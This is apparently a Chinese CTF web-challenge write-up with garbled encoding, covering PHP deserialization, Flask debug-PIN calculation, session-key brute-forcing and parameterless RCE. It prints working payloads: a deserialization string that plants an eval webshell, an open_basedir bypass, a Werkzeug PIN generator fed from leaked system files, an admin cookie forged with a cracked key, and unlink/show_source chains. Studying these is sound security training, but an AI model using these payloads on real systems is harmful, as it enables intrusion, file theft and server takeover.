<h2 id="ez-remove"><a href="#ez-remove" class="headerlink" title="ez_remove"></a>ez_remove</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;lover;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;daozhel&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;lover);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lover/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;å¿«æ¥ç©å¿«æ¥ç©~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨åå…­è¿›åˆ¶è¦ç»•è¿‡æ­£åˆ™åŒ¹é…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lover ==&gt; \6cover</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨gcå›æ”¶ç»•è¿‡å¼‚å¸¸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;syc&quot;:1  ==&gt; O:3:&quot;syc&quot;:2</span><br></pre></td></tr></table></figure>

<p>å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯è¦å°†<strong>å°å†™sè½¬å˜å¤§å†™S</strong> ,æ‰èƒ½è§£æåå…­è¿›åˆ¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?web=O:<span class="number">3</span>:<span class="string">&quot;syc&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">5</span>:<span class="string">&quot;\6cover&quot;</span>;s:<span class="number">53</span>:<span class="string">&quot;file_put_contents(&#x27;2.php&#x27;,&#x27;&lt;?php @eval(<span class="subst">$_POST</span>[1]);&#x27;);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>



<p>å†™å…¥æœ¨é©¬ ï¼Œå‘ç°æ— æ³•æ­£å¸¸æ‰§è¡Œshellå‘½ä»¤ï¼Œè¯»å–phpinfoæŸ¥çœ‹disable_functions</p>
<p>å‘ç°ç¦ç”¨äº†å‡½æ•°<strong>system,exec,shell_exec,fopen,pcmtl_exe,passthru,popen</strong></p>
<p>è¿˜æœ‰<strong>open_basedir: &#x2F;var&#x2F;www&#x2F;html&#x2F;</strong></p>
<p>ç»•è¿‡open_basedir: <strong>ini_setç”¨æ¥è®¾ç½®php.iniçš„å€¼ï¼Œæ— éœ€æ‰“å¼€php.iniæ–‡ä»¶ï¼Œå°±èƒ½ä¿®æ”¹é…ç½®</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;test&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;test&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;f1ger&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="ez-path-os-path-join"><a href="#ez-path-os-path-join" class="headerlink" title="ez_path(os.path.join)"></a>ez_path(os.path.join)</h2><p><a target="_blank" rel="noopener" href="https://www.toolkk.com/tools/pyc-decomplie#google_vignette">pycåœ¨çº¿åæ±‡ç¼–</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.8.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.6 (3379)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.7.0 (default, Nov 25 2022, 11:07:23) </span></span><br><span class="line"><span class="comment"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]</span></span><br><span class="line"><span class="comment"># Embedded file name: ./tempdata/96e9aea5-79fb-4a2f-a6b9-d4f3bbf3c906.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2023-08-26 01:33:29</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 2076 bytes</span></span><br><span class="line"><span class="keyword">import</span> os, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">ARTICLES_FOLDER = <span class="string">&#x27;articles/&#x27;</span></span><br><span class="line">articles = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Article</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, article_id, title, content</span>):</span><br><span class="line">        self.article_id = article_id</span><br><span class="line">        self.title = title</span><br><span class="line">        self.content = content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_article_id</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, articles=articles)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        title = request.form[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        content = request.form[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">        article_id = generate_article_id()</span><br><span class="line">        article = Article(article_id, title, content)</span><br><span class="line">        articles.append(article)</span><br><span class="line">        save_article(article_id, title, content)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/article/&lt;article_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">article</span>(<span class="params">article_id</span>):</span><br><span class="line">    <span class="keyword">for</span> article <span class="keyword">in</span> articles:</span><br><span class="line">        <span class="keyword">if</span> article.article_id == article_id:</span><br><span class="line">            title = article.title</span><br><span class="line">            sanitized_title = sanitize_filename(title)</span><br><span class="line">            article_path = os.path.join(ARTICLES_FOLDER, sanitized_title)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(article_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> (file):</span><br><span class="line">                content = file.read()</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;articles.html&#x27;</span>, title=sanitized_title, content=content, article_path=article_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_article</span>(<span class="params">article_id, title, content</span>):</span><br><span class="line">    sanitized_title = sanitize_filename(title)</span><br><span class="line">    article_path = ARTICLES_FOLDER + <span class="string">&#x27;/&#x27;</span> + sanitized_title</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(article_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> (file):</span><br><span class="line">        file.write(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize_filename</span>(<span class="params">filename</span>):</span><br><span class="line">    sensitive_chars = [</span><br><span class="line">     <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;.&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> sensitive_chars:</span><br><span class="line">        filename = filename.replace(char, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># okay decompiling /tmp/65448aefd10b0.pyc</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä»£ç æ¯”è¾ƒç®€å•ï¼Œå°±ä¸€ä¸ªå†™å’Œçœ‹çš„åŠŸèƒ½</p>
<p>æ¼æ´ç‚¹åœ¨ï¼šos.path.joinå‡½æ•°æ²¡æœ‰å¯¹è·¯å¾„åšå¾ˆå¥½çš„å¤„ç†ï¼Œå°†æœ€åä¸€ä¸ªåæ–œæ çœ‹ä½œè·¯å¾„çš„å¼€å¤´ï¼Œæ‰€ä»¥å¯ä»¥ä»»æ„æ–‡ä»¶æ³„éœ²</p>
<p>ç„¶åå‘ç°debug&#x3D;Trueï¼Œé‚£æ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼Œé€šè¿‡os.path.joinå‡½æ•°æ³„éœ²æ–‡ä»¶è®¡ç®—pinç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  <span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.9/site-packages/flask/app.py&#x27;</span>  <span class="comment"># æŠ¥é”™å¾—åˆ°</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;37782193255385&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span></span><br><span class="line">    <span class="string">&#x27;31e70710-1d09-4cda-bc57-a7a012a89ef7docker-8037c9ea09717214042823e30fbac73b8ffa9c2671fad321c717e11489690a6b.scope&#x27;</span></span><br><span class="line">    <span class="comment"># /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20231107185420.png"></p>
<h2 id="you-konw-flask"><a href="#you-konw-flask" class="headerlink" title="you konw flask?"></a>you konw flask?</h2><p>robots.txtæ³„éœ²äº†3ysd8.html</p>
<p>è®¿é—®3ysd8.htmlå¾—åˆ°ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- keyæ˜¯  app.secret_key = &#x27;wanbao&#x27;+base64.b64encode(str(random.randint(1, 100)).encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)+&#x27;wanbao&#x27; (www,æˆ‘å¯çˆ±çš„è€å®,æˆ‘å­˜çš„å¤Ÿå®‰å…¨çš„å§) --&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dict.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        original_string =<span class="built_in">str</span>(i)</span><br><span class="line">        byte_data = original_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        encoded_data = base64.b64encode(byte_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        fp.write(<span class="string">&#x27;&quot;wanbao&#x27;</span>+encoded_data + <span class="string">&#x27;wanbao&quot;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Project&gt; flask-unsign --unsign --cookie <span class="string">&quot;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiJ0ZXN0IiwidXNlcl9pZCI6Mn0.ZUoT_Q.rZAY3c8K33S38x_AydOHdOh4ozQ&quot;</span> --wordlist ./test/ctf_web/<span class="built_in">dict</span>.txt</span><br><span class="line">[*] Session decodes to: &#123;<span class="string">&#x27;is_admin&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;user_id&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line">[*] Starting brute-forcer <span class="keyword">with</span> <span class="number">8</span> threads..</span><br><span class="line">[+] Found secret key after <span class="number">99</span> attempts</span><br><span class="line"><span class="string">&#x27;wanbaoMzU=wanbao&#x27;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &quot;wanbaoMzU=wanbao&quot; -t &quot;&#123;&#x27;is_admin&#x27;: True, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: 1&#125;&quot; </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">eyJpc19hZG1pbiI6dHJ1ZSwibmFtZSI6ImFkbWluIiwidXNlcl9pZCI6MX0.ZUoU3g.xvaYWmDWnhze2kXQpN0BTWOBuqY</span></span><br></pre></td></tr></table></figure>





<h2 id="Pupyy-rce-æ— å‚RCE"><a href="#Pupyy-rce-æ— å‚RCE" class="headerlink" title="Pupyy_rce(æ— å‚RCE)"></a>Pupyy_rce(æ— å‚RCE)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure>

<p>flag.phpæ–‡ä»¶åœ¨ä¸­é—´ï¼Œä¸èƒ½åƒå¹³å¸¸ä¸€æ ·</p>
<p>é€šè¿‡unlinkä½¿å¾—flag.phpæ˜¯å€’æ•°ç¬¬äºŒä¸ªæ–‡ä»¶åœ¨è¯»å–å°±okäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">unlink(end(scandir(current(localeconv()))));</span><br><span class="line">unlink(end(scandir(current(localeconv()))));</span><br><span class="line">unlink(next(array_reverse(scandir(current(localeconv())))));</span><br><span class="line">show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>



<p>è¡¥å……ï¼š</p>
<p>æœ‰å‡ ç‡å¯ä»¥æŸ¥çœ‹æ ¹ç›®å½•ï¼Œstrrev(crypt(serialize(array())))<code>æ‰€è·å¾—çš„å­—ç¬¦ä¸²ç¬¬ä¸€ä½æœ‰å‡ ç‡æ˜¯</code>&#x2F;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))));</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/157431794">å‚è€ƒ</a></p>
<h2 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h2><h3 id="æºç -2"><a href="#æºç -2" class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;key.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;è¿›æ¥å•¦&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line">        <span class="variable">$randomString</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="variable">$characters</span>), <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="variable">$randomString</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;bro===<span class="variable language_">$this</span>-&gt;secret)&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;qwe;        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span 